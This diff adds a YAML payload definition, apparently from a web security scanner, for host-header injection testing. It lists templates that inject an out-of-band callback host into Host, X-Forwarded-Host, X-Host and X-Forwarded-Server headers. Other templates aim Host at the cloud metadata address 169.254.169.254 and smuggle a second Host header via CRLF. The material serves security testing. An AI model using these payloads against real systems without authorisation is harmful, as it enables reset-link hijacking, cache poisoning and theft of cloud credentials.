@@ -1,0 +1,42 @@
+family_id: host_header_injection
+description: >-
+  Host-header trust-boundary probes covering password-reset-link poisoning,
+  routing-based SSRF (Host steers the upstream), and absolute-URL / cache-key
+  poisoning via unkeyed X-Forwarded-Host and sibling override headers. Pairs
+  with OAST confirmation since most of these are blind reflection bugs.
+cwe_ids: [644]
+owasp_top10:
+  - 'A10:2021'
+risk_level: medium
+requires_approval: false
+oast_required: true
+payloads:
+  - id: xfh_reset_poison
+    template: 'X-Forwarded-Host: {oast_host}'
+    confidence: likely
+    notes: Password-reset link host poisoning via unkeyed X-Forwarded-Host; confirm via OAST hit in the reset email.
+  - id: host_override_raw
+    template: 'Host: {oast_host}'
+    confidence: likely
+    notes: Direct Host override; some frameworks build absolute URLs from request Host with no allow-list check.
+  - id: x_host_override
+    template: 'X-Host: {oast_host}'
+    confidence: suspected
+    notes: Alternate trusted-header override; some reverse proxies forward X-Host unkeyed.
+  - id: x_forwarded_server
+    template: 'X-Forwarded-Server: {oast_host}'
+    confidence: suspected
+    notes: Legacy proxy header; some apps trust it for absolute-URL / link construction.
+  - id: routing_ssrf_metadata
+    template: 'Host: 169.254.169.254'
+    confidence: suspected
+    notes: Routing-based SSRF; Host header steers the front-end's upstream selection toward cloud metadata.
+  - id: dual_host_smuggle
+    template: "Host: {target_host}\r\nHost: {oast_host}"
+    confidence: suspected
+    notes: Dual-Host header smuggling; some stacks parse the second Host value for routing/link generation.
+mutations: []
+encodings:
+  - name: identity
+    stages: []
+    description: Raw header payload.
